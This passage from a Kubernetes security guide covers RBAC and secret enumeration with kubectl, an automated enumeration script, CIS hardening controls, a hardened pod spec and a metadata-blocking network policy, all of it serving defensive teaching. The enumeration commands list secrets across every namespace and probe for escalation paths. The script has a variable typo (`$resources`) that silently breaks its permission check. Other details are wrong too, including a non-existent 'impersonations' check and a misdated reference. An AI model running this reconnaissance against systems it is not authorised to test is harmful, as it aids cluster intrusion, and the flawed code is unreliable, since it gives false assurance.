| **Type** | Admission webhook bypass |
| **Impact** | Bypass of image policy validation |

**Technical Details**: The `ImagePolicyWebhook` admission plugin could be bypassed by including a malformed image reference. The webhook was called with the original image reference, but the kubelet could resolve the reference differently, allowing unauthorized images to be deployed.

---

## 11. kubectl auth can-i Enumeration

### 11.1 Permission Enumeration Techniques

```bash
# kubectl auth can-i: Check if an operation is allowed
# This is the primary tool for RBAC enumeration in Kubernetes

# Check if you can do anything in the current namespace
kubectl auth can-i --list

# Check specific permissions
kubectl auth can-i create pods
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i delete pods -n production
kubectl auth can-i escalate pods -n production

# Check permissions for a different user (requires impersonation)
kubectl auth can-i create pods --as=system:serviceaccount:default:my-sa

# Enumerate all permissions in all namespaces
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== Namespace: $ns ==="
  kubectl auth can-i --list -n $ns
done

# Focus on dangerous permissions
kubectl auth can-i create pods                  # Can create pods (may escalate)
kubectl auth can-i create pods/exec             # Can exec into pods
kubectl auth can-i get secrets                  # Can read secrets
kubectl auth can-i create clusterrolebindings   # Can escalate to cluster-admin
kubectl auth can-i create mutatingwebhookconfigurations  # Can intercept API requests
kubectl auth can-i create validatingwebhookconfigurations # Can intercept API requests
kubectl auth can-i get pods -n kube-system      # Can see system pods
kubectl auth can-i list nodes                    # Can enumerate nodes
kubectl auth can-i proxy nodes                   # Can proxy to kubelet

# Enumerate accessible secrets in all namespaces
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== Namespace: $ns ==="
  kubectl get secrets -n $ns -o jsonpath='{.items[*].metadata.name}'
done

# Check if you can impersonate other users
kubectl auth can-i create impersonations --as=system:admin
kubectl auth can-i create self-subjectaccessreviews
```

### 11.2 Automated RBAC Enumeration Scripts

```bash
#!/bin/bash
# k8s_enum_rbac.sh — Automated RBAC enumeration script

echo "=== Kubernetes RBAC Enumeration ==="
echo ""

echo "[1] Current identity"
kubectl auth whoami 2>/dev/null || kubectl get sa -o jsonpath='{.items[0].metadata.name}' 2>/dev/null
echo ""

echo "[2] Self-subject access review (what can I do?)"
kubectl auth can-i --list 2>/dev/null
echo ""

echo "[3] Dangerous permissions check"
DANGEROUS_VERBS=("create" "update" "patch" "delete" "deletecollection" "escalate" "bind")
DANGEROUS_RESOURCES=("secrets" "pods" "pods/exec" "pods/attach" "clusterroles" "clusterrolebindings" "roles" "rolebindings" "nodes" "nodes/proxy" "mutatingwebhookconfigurations" "validatingwebhookconfigurations" "serviceaccounts" "serviceaccounts/token" "configmaps")

for verb in "${DANGEROUS_VERBS[@]}"; do
  for resource in "${DANGEROUS_RESOURCES[@]}"; do
    if kubectl auth can-i $verb $resources 2>/dev/null | grep -q "yes"; then
      echo "[!] DANGEROUS: Can $verb $resource"
    fi
  done
done
echo ""

echo "[4] Namespace enumeration"
kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'
echo ""
echo ""

echo "[5] Secret enumeration (accessible namespaces)"
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  if kubectl auth can-i get secrets -n $ns 2>/dev/null | grep -q "yes"; then
    echo "[+] Can read secrets in namespace: $ns"
    kubectl get secrets -n $ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null
    echo ""
  fi
done

echo "[6] Pod enumeration (accessible namespaces)"
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  if kubectl auth can-i get pods -n $ns 2>/dev/null | grep -q "yes"; then
    echo "[+] Can read pods in namespace: $ns"
    kubectl get pods -n $ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null
    echo ""
  fi
done
```

---

## 12. Kubernetes Security Hardening

### 12.1 CIS Kubernetes Benchmark Summary

| Area | Control | Recommendation |
|---|---|---|
| **Control Plane** | API server authentication | Disable anonymous auth (`--anonymous-auth=false`) |
| **Control Plane** | RBAC | Enable RBAC (`--authorization-mode=RBAC`) |
| **Control Plane** | Audit logging | Enable audit logging with policy file |
| **Control Plane** | etcd encryption | Enable encryption at rest for secrets |
| **Control Plane** | TLS | Use valid certificates, disable insecure port |
| **Node** | Kubelet authentication | Disable anonymous access, require certificates |
| **Node** | Kubelet authorization | Use webhook authorization |
| **Node** | Read-only port | Disable kubelet read-only port |
| **Pod** | Security context | Run as non-root, drop capabilities |
| **Pod** | Network policies | Default-deny all ingress/egress |
| **Pod** | Service accounts | Disable auto-mounting of SA tokens |
| **Pod** | Image policies | Use signed images, enforce with ImagePolicyWebhook |

### 12.2 Complete Hardened Pod Specification

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
  namespace: production
  labels:
    app: hardened-app
spec:
  serviceAccountName: restricted-sa
  automountServiceAccountToken: false
  hostNetwork: false
  hostPID: false
  hostIPC: false
  priorityClassName: system-cluster-critical
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
    supplementalGroups: [1000]
  containers:
  - name: app
    image: gcr.io/distroless/static:nonroot@sha256:abc123...
    imagePullPolicy: Always
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    resources:
      limits:
        memory: "512Mi"
        cpu: "1"
      requests:
        memory: "256Mi"
        cpu: "500m"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: cache
      mountPath: /var/cache
    env:
    - name: LOG_LEVEL
      value: "info"
    livenessProbe:
      httpGet:
        path: /healthz
        port: 8080
      initialDelaySeconds: 10
      periodSeconds: 10
    readinessProbe:
      httpGet:
        path: /readyz
        port: 8080
      initialDelaySeconds: 5
      periodSeconds: 5
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory
      sizeLimit: "128Mi"
  - name: cache
    emptyDir:
      medium: Memory
      sizeLimit: "256Mi"
  topologySpreadConstraints:
  - maxSkew: 1
    topologyKey: kubernetes.io/hostname
    whenUnsatisfiable: DoNotSchedule
    labelSelector:
      matchLabels:
        app: hardened-app
```

### 12.3 Network Policy Best Practices

```yaml
# Step 1: Default-deny all ingress and egress in every namespace
# (Apply as a baseline to all namespaces)

# Step 2: Allow only necessary traffic
# - Frontend: allow ingress from load balancer, egress to backend
# - Backend: allow ingress from frontend, egress to database
# - Database: allow ingress from backend, no egress except DNS

# Step 3: Deny traffic to metadata service
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-service
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32  # AWS metadata
              - 169.254.169.254/32  # Azure metadata
              - 169.254.169.254/32  # GCP metadata
```

**Cross-reference**: Kubernetes security builds directly on container security primitives (see `02a_container_security.md` for namespaces, cgroups, seccomp, and AppArmor). Cloud metadata service attacks against Kubernetes pods follow the same SSRF patterns described in `01a_cloud_architecture_security.md`. The RBAC enumeration techniques here complement the IAM enumeration patterns in `01b_identity_access_management.md`.

---

*Next: [03a — Serverless Security](03a_serverless_security.md)*

---

## References

1. CVE-2018-1002105. NVD. https://nvd.nist.gov/vuln/detail/CVE-2018-1002105
2. CVE-2022-3172. NVD. https://nvd.nist.gov/vuln/detail/CVE-2022-3172
3. NSA/CISA. "Kubernetes Hardening Guide." *National Security Agency*. 2022. https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
4. Kubernetes. "Pod Security Standards." *Kubernetes Documentation*. 2024. https://kubernetes.io/docs/concepts/security/pod-security-standards/
5. Kubernetes. "RBAC API Reference." *Kubernetes Documentation*. 2024. https://kubernetes.io/docs/reference/access-authn-authz/rbac/
6. Zola, A. "Kubernetes main attack vectors tree: an explainer guide." *CNCF*. 2021. https://www.cncf.io/blog/2021/11/08/kubernetes-main-attack-vectors-tree-an-explainer-guide/
7. CIS. "CIS Kubernetes Benchmark." *Center for Internet Security*. 2024. https://www.cisecurity.org/cis-benchmarks/
8. Kubernetes. "Network Policies." *Kubernetes Documentation*. 2024. https://kubernetes.io/docs/concepts/services-networking/network-policies/
9. Kubernetes. "Kubelet Authentication and Authorization." *Kubernetes Documentation*. 2024. https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/
10. NIST. "SP 800-190: Application Container Security Guide." *National Institute of Standards and Technology*. 2024. https://csrc.nist.gov/publications/detail/sp/800-190/final